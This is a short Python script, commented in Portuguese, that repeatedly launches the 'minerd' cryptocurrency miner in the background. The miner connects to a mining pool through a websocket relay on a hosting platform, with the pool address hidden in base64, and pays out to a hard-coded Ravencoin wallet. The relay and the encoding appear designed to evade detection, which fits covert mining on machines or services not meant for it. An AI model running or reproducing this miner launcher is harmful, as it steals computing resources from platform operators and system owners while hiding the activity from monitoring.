import os
import time

# Fica em loop para minerar a criptomoeda
while True:
    # Executa o comando de mineração
    os.system("nohup minerd -a minotaurx -o wss://broken-ardene-mino-fecf729c.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ== -u RPAwbi57Le4u5L2Kniz1ZgGYEgHdCXx3Wu.RVN -p c=RVN")

    # Dorme por 1 hora antes de reiniciar a mineração
    time.sleep(3600)
